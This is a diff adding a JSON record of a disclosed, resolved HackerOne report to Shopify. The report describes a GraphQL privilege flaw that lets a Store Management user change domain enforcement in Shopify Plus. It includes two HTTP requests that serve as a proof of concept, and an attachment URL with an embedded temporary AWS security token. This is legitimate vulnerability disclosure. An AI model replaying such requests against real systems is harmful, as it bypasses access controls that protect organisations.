@@ -1,0 +1,216 @@
+{
+  "id": 1084892,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg0ODky",
+  "url": "https://hackerone.com/reports/1084892",
+  "title": "[h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-01-22T22:10:18.150Z",
+  "submitted_at": "2021-01-22T22:10:18.229Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ngalog",
+    "url": "/ngalog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-21T22:05:27.786Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-04-21T22:05:27.724Z",
+  "team_member_agreed_on_going_public_at": "2022-04-21T18:50:12.812Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nUser with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only\n\n## Description:\nUser with `Store management` permission - {F1168470} only, is able to change user management settings using the graphql\n\n## Steps To Reproduce:\n- \n- \n- \n- \n\n- As an org plus admin, visit https://shopify.plus/:org_plus_id/users/invite and invite an user to have `store management permission` - (The purpose is to enable the low-privileged user to have access to https://shopify.plus/:plus_org_id/stores/api\n- As an org plus admin, create a Org domain, by visiting `https://shopify.plus/:id/users/security` and `Add Domain`\n- Login as the low-priviledged user, and visit shopify.plus and click around until you made a valid graphql call to shopify.plus, it looks something like this `POST /34946971/stores/api HTTP/1.1`\n- Make this call to figure out the domain id of your organization as a low privileged user \n\n```\nPOST /34946971/stores/api HTTP/1.1\nHost: shopify.plus\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\n...\n\n{\"query\":\"query{organization{domains{id}}}\"}\n```\n\n- Grab the id and replace the REPLACE_ME in the below GraphQL call\n\n```\nPOST /34946971/stores/api HTTP/1.1\nHost: shopify.plus\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\n...\n\n{\"query\":\"mutation  {\\n  changeDomainEnforcementState(domainIds: [\\\"REPLACE_ME\\\"],enforcementState:NOT_ENFORCED) {\\n    organization {\\n      id\\n      domains {\\n        id\\n        domainName\\n        status\\n        verified\\n        __typename\\n      }\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\n- Then it shows you are able to `changeDomainEnforcementState` by just having Store Management permission\n\n\n\n## Supporting Material/References:\n\n## Impact\n\nUser with Store Management permission can enforce/unenforce domain state",
+  "weakness": {
+    "id": 122,
+    "name": "Improper Privilege Management"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1168470,
+      "file_name": "Screen_Shot_2021-01-22_at_11.15.03_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dibowxlxtkmb5y4x45d1cohhzpvd?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-22_at_11.15.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-22_at_11.15.03_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ54VOPKUF%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T053759Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJIMEYCIQDtBXHRUCtvwfTC6rES1dMnOFbqFHOvXQQKFkDxW%2BYXjAIhALpXttECOORO81V7bp7ku%2FeRfjeqdn0yH2IiB%2FI7xYJgKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgwpsTSN8J7xIArJ4oUqjwUih3t9U7fnw9OFuz58XbZU07XQUom005cirmukl8bFWPsMdKRMAMhXYVF31jprbAL%2BtzMTd3kRRiX9cT5B5uyNVcUuJC4iWhHRRKshk6DDoRD3dOVpkfFDqg%2FYNL%2BVtwS2Kl5EQXAZyhd%2BLBw7NGBszfIzaGU%2BX1s7Ru%2FoJfAdnEfso5k79jgccbDnUHnnA%2Ba5RoH7yFm98dd444ZO6YGVq8916QTe3Q%2Bi6LOgDaT69Zo%2BhOIMsqnFyRtrcOTHTTjcDjoXqPk1DXO7dqw1FuN0gpnJj%2Bq4FTHf8IC4sXMho66KLQ4Ha3dkgI32931olfzFkasmvBcDdv2gN5hKvEBsysGo5BfFQx%2Blo5XKULcP4xqPIHwCWKiN2viFHIzv49qoSysEQytMw5WtZyyD8Q989Xm4l0CHjvlf8I6JYFen8lFUybIBWlP8AbRIvC7wJOyKomX63HzTux2qbsr5EbexuBt3Jmx6xJvUNTcEVz9y4oHp3zk0yhcTkW%2F54JF76pqfLWlUYQDYN9G1Sq%2FjFLdPspSaLpEX1mgwy2FUBzZWnYHlZuYSaS2O7sX2wCIDFJuxWR%2BPX9XnxP7yY90nANUxFKDORBeTb3hwdkn%2BhDb%2FZIJLp86s1Mw6I8drGF%2F%2BOtibhrYpZJMwdZc%2FpFT0uwkZFDShW74v1CLtBVGwRxZCV1KBw12U67gaZ5hwBEl0pjkhZWM%2FYiJ8F7Avsr90gL07ZK4JF2e67IGU%2BHuasLD11YbtMlOK%2FMamqHTALCYN2YYuTzmXg8VQHoiEzMMSSx2UVJR%2BAMk4SUHuV6NBdlYO7%2BDLXh6QMGdmiaEGqL2MltcNEshL4uY0eKj11U3XZwkPNhxoBjH6Qu3H%2B%2FXk%2FfgvMJWNndIGOrABHr7AHvnGZMKP0W62W%2F9hl6bJnqyCNy0wBM2vsNr7XPrOOstlzfJnjCRVMtj6abKz0WX5eeB01f1%2BSr6UHv4jAmd8HwWWqrIRg8%2Fz4V2yorq%2BOvZcY29XLkDvNld8pCdKeFsoXqypEmdG2XwlAIXEW0KSeSksBGE0sMnr2Sb7uNqe0a1h%2BsWNZpAEayQdZbZ5xmj2wYEi4icuBemKxJoiIfO6TA9e%2F%2BMdYd9yh7lsWTM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=88cd6b3e708abda723672819acb6ff4f16ae2e63b74d2d9326efe22d261fd9a9",
+      "file_size": 222355,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "rondons",
+    "n1m0",
+    "similardisaster",
+    "zy9ard3",
+    "ali",
+    "shreyaschavhan",
+    "encodedguy",
+    "shubham_srt",
+    "sudi",
+    "ayoub0x1",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 62960,
+    "asset_type": "OTHER",
+    "asset_identifier": "Plus Web Admin with Single Domain Feature",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1084892",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2022-04-21T22:05:27.832Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:37:59.505936",
+    "source": "https://hackerone.com/reports/1084892.json",
+    "report_id": 1084892
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg0ODky",
+    "databaseId": "1084892",
+    "title": "[h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only",
+    "url": "https://hackerone.com/reports/1084892",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-04-21T22:05:27.786Z",
+    "created_at": "2021-01-22T22:10:18.150Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzEyMg==",
+      "name": "Improper Privilege Management",
+      "external_id": "cwe-269"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 4.3
+    },
+    "reporter": {
+      "username": "ngalog"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNzQxNzM=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2021-01-30T17:07:34.807Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzEwODQ4OTI=",
+    "_id": "1084892",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2022-04-21T22:05:27.832Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg0ODky",
+      "databaseId": "1084892",
+      "title": "[h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only",
+      "url": "https://hackerone.com/reports/1084892",
+      "disclosed_at": "2022-04-21T22:05:27.786Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    }
+  }
+}
